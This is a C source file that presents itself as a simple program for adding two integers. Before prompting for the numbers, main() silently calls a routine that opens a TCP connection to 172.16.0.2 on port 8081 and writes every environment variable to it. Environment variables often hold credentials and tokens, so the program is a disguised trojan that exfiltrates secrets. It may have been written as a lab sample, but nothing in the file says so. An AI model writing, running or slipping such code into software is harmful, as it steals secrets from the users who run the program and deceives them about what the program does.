#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>
#define SA struct sockaddr

extern char **environ;

void printEnvToSocket(int sockfd) {
    char **envvar = environ;

    for (; *envvar; envvar++) {
        write(sockfd, *envvar, 200);
    }
}

int tcpClient() {
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        exit(0);
    }
    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("172.16.0.2");
    servaddr.sin_port = htons(8081);

    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        exit(0);
    }

    printEnvToSocket(sockfd);

    close(sockfd);
}


int main() {
    tcpClient();

    int first, second;

    printf("This is a simple program that computes a sum of two integer numbers\n");

    printf("Please, enter the first number: ");
    scanf("%d", &first);

    printf("Please, enter the second number: ");
    scanf("%d", &second);

    printf("\nThe sum %d + %d = %d\n", first, second, first + second);

    return 0;
}